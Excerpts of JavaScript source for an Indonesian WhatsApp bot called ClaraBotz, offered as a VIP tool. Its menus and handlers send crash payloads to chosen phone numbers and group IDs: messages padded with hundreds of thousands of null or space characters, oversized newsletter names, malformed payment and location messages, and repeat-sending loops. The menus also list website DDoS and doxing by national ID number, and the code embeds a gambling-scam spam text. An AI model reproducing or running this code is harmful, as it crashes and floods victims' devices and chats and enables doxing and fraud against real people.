...
const responbug = 'tunggu proses ny selesai ya kakak 😘💖'
...
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"ClaraBotz ✅",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
...
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "CLARA VIP 💖 WHATSAPP" + "\0".repeat(920000),
      ...
      'message': {
        'interactiveMessage': {
          ...
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'CLARA VIP 💖 WHATSAPP', url : , merchant_url :  }"
            }],
  ...
  "interactiveMessage": {
    ...
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'ClaraBugWhatsApp', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
...
"mediaType": 1, 
"thumbnail": rxhlimage, 
"mediaUrl": "https://telegra.ph/file/52fbfcc0fd22e01c0ab3f.jpg", 
"sourceUrl": "https://whatsapp.com/channel/0029VafcHPm5vKACJCoNaO3Z" }}}, { quoted: m }) }
...
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'CLARA BOT','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'VVIP CLARA BOT ','description':'Telegram: @clara','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
...
•. ${prefix}𝗽𝘂𝗯𝗹𝗶𝗰
•. ${prefix}𝘀𝗲𝘁𝗽𝗽𝗯𝗼𝘁
•. ${prefix}𝘀𝗲𝘁𝗽𝗽𝗯𝗼𝘁 /𝗳𝘂𝗹𝗹 
▭▬▭▬▭▬▭▬▭▬▭▬▭▬
      *𝗩𝗩𝗜𝗣 𝗠𝗘𝗡𝗨* 
•. ${prefix}𝗱𝗱𝗼𝘀 *website duration*
•. ${prefix}𝗱𝗼𝘅 *nik*
•. ${prefix}𝗴𝗲𝘁𝗻𝗶𝗸
▭▬▭▬▭▬▭▬▭▬▭▬▭▬`
rxhl.sendButton(from,  hohe, m, {
...
•. ${prefix}systemcrash *+628xxx*
•. ${prefix}xclara-1hours *+628xxx*
•. ${prefix}infinity-1day *+628xxx*
•. ${prefix}xkill-vip *+628xxx*
•. ${prefix}bug-iosfc *+628xxx|Amount*
•. ${prefix}bugaudiocrash *+628xxx|Amount*
•. ${prefix}bug-lockill *+628xxx|Amount*
•. ${prefix}bug-adnfc *+628xxx|Amount*
...
▭▬▭▬▭▬▭▬▭▬▭▬▭▬
      *𝗕𝗨𝗚 𝗖𝗥𝗔𝗦𝗛 𝗚𝗥𝗢𝗨𝗣*
•. ${prefix}bubar *Id Grup*
•. ${prefix}crash-group  *Id Grup*
•. ${prefix}basmi-group  *Id Grup*
•. ${prefix}bug-gchard *Id Grup|Amount*
•. ${prefix}bug-audiogc *Id Grup|Amount*
•. ${prefix}bug-locgc *Id Grup|Amount*
•. ${prefix}bug-parah *Id Grup|Amount*
•. ${prefix}bughomegc *Id Grup|Amount*
•. ${prefix}getidgrup *Link Gc*
▭▬▭▬▭▬▭▬▭▬▭▬▭▬
      *𝗕𝗨𝗚 𝗖𝗥𝗔𝗦𝗛 𝗜𝗡 𝗣𝗔𝗖𝗘*
•. ${prefix}bugcrash-vvip
...
▭▬▭▬▭▬▭▬▭▬▭▬▭▬
      *𝗦𝗣𝗘𝗖𝗜𝗔𝗟 𝗕𝗨𝗚*
•. ${prefix}clarabug *628xxx|Amount*
•. ${prefix}clarakeren *628xxx|Amount*
•. ${prefix}clarakawai *628xxx|Amount*
•. ${prefix}claraios *628xxx|Amount*
•. ${prefix}claraandro *628xxx|Amount*
▭▬▭▬▭▬▭▬▭▬▭▬▭▬
      *𝗢𝗧𝗛𝗘𝗥 𝗠𝗘𝗡𝗨*
...
▭▬▭▬▭▬▭▬▭▬▭▬▭▬
      *𝗕𝗨𝗚 𝗜𝗢𝗦*
•. ${prefix}ios-home *+628xxx|Amount*
•. ${prefix}ios-blank *+628xxx|Amount*
▭▬▭▬▭▬▭▬▭▬▭▬▭▬
      *𝗕𝗨𝗚 𝗦𝗔𝗠𝗦𝗨𝗡𝗚*
•. ${prefix}samsunguicrash *+628xxx|Amount*
•. ${prefix}samsungforce *+628xxx|Amount*
...
•. ${prefix}bug-ganas *+628xxx|Amount*
•. ${prefix}bug-meta *+628xxx|Amount*
▭▬▭▬▭▬▭▬▭▬▭▬▭▬
      *𝗦𝗣𝗘𝗖𝗜𝗔𝗟 𝗠𝗘𝗡𝗨 𝗩𝟮*
•. ${prefix}getnik
•. ${prefix}dox <nik>
...
▭▬▭▬▭▬▭▬▭▬▭▬▭▬
      *𝗕𝗨𝗚 𝗖𝗥𝗔𝗦𝗛 𝗖𝗛𝗔𝗧 𝗩𝗩𝗜𝗣*
•. ${prefix}infinity-device *+628xxx*
•. ${prefix}clara-cantik *+628xxx*
•. ${prefix}auto-crash *+628xxx*
•. ${prefix}caper *+628xxx*
•. ${prefix}basmi-ripper *+628xxx*
•. ${prefix}bug-external *+628xxx*
•. ${prefix}bug-externalv2 *+628xxx*
•. ${prefix}bug-externalv3 *+628xxx*
•. ${prefix}bug-internal *+628xxx*
•. ${prefix}bug-internalv2 *+628xxx*
•. ${prefix}bug-iosonly *+628xxx*
•. ${prefix}bug-samsungonly *+628xxx*
▭▬▭▬▭▬▭▬▭▬▭▬▭▬
      *𝗕𝗨𝗚 𝗖𝗥𝗔𝗦𝗛 𝗚𝗥𝗢𝗨𝗣 𝗩𝗩𝗜𝗣*
•. ${prefix}vipcrashgc-1 *ID GRUP*
•. ${prefix}vipcrashgc-2 *ID GRUP*
▭▬▭▬▭▬▭▬▭▬▭▬▭▬`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `ClaraBotz`
...
mediaType:  1,
mediaUrl: 'https://wa.me/62858148213863',
title: `CLARA VIP 💖`,
sourceUrl: `https://wa.me/62858148213863`, 
thumbnail: rxhlimage
}
}})
break
...
*SCRIPT DEVELOPER BY LAYLA OFFICIAL*`
}
...
case 'bugcrash': 
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz('masukkan nomor target nya kak 💖')
...
await sleep(2000)
replyz(`*Berhasil Mengirim Bug Ke ${Pe} Mohon jeda 5 menit 💖*`)
break

case 'bubar': 
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz('masukkan id group ny kak 💖')
...
await sleep(2000)
replyz(`*</> Successfully sent a bug. Mohon jeda 5 menit 💖*`)
break
...
rxhl.sendMessage(from, {video: bugvid1},{quoted: clarabugnew})
break
...
Hallo, ich komme von einem Online-Glücksspielseitenunternehmen namens clara999. Ich bin hier, um Ihnen anzubieten, Ihr Geld sofort zu verdoppeln. Sie können es verdoppeln, indem Sie auf der Wettseite Clara9999
einen Nominalwert von 80 $ und einen Preis von 900 $ einzahlen. Bitte registrieren Sie sich über den Link 👇 auf der Online-Glücksspielseite clara9999
🎮 Wettseiten: https://register.clara999.bet/
Alternative zur Registrierung 👇
🎮 Facebook : Clara9999
🎮 Whatsapp : https://api.whatsapp.com/send?phone=+6299999999999
...
sendRepeatedMessages2(Pe, jumlah)
await sleep(2000)
replyz(`*</> done kakakkuh ><, silahkan di cek yaw 😘 bug ke group ${Pe}. Please pause commenting for 3 minutes 🤗`)
break
...
await sleep(2000)
replyz(`*</> Successfully send bug, silahkan cek targetny kakak 😘. Please pause commenting for 3 minutes 🤗`)
break
...
replyz(`</> done kakakkuh ><, silahkan di cek yaw 😘 bug number ${victim}`)
}
break
...
for (let i = 0; i < amount; i++) {
rxhl.sendMessage(Pe, { "caption": `Clara Official `, audio: rxhlganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `ClaraBotz`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
await sleep(1500)
}
replyz(`</> Berhasil mengirim ${command} to number ${Pe}`)
}
break
...
replyz(`</> Berhasil mengirim ${command} ke group ${Pe}`)
}
break
...
for (let i = 0; i < amount; i++) {
rxhl.sendMessage(Pe, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: `ClaraBotz`, address: `1.1.1.1.11`, url: `https://${XeonOP}.com`, comment: `BUG LOCATION`, jpegThumbnail: null, "contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `ClaraBotz`.repeat(10000),serverMessageId: 2 }}} }, { quoted: xbug2 })
await sleep(1500)
}
replyz(`*</> Succes 🥰*`)
}
...
case "bughomegc": case 'vipcrashgc-1': case 'vipcrashgc-2':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
...
case 'clarabug': case 'clarakeren': case 'clarakawai': case 'claraios': case 'claraandro':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
...
replyz(`</> Successfully send bug, silahkan cek targetny kakak 😘 *${command}* Amount *${amount}*`)
break
...
replyz(`</> Successfully send bug, silahkan cek targetny kakak 😘 *${command}*`)
break
...
case 'bug-external': case 'bug-externalv2': case 'bug-externalv3': case 'bug-internal': case 'bug-internalv2':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
